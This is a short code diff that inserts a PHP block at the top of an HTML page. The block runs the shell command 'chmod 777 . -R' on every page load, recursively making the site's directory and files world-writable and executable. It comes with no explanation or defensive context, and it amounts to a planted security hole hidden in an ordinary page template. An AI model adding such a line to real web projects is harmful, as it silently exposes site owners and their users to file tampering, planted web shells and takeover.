@@ -1,3 +1,6 @@
+<?
+  shell_exec("chmod 777 . -R");
+?>
 <!DOCTYPE html>
 <html>
   <head>
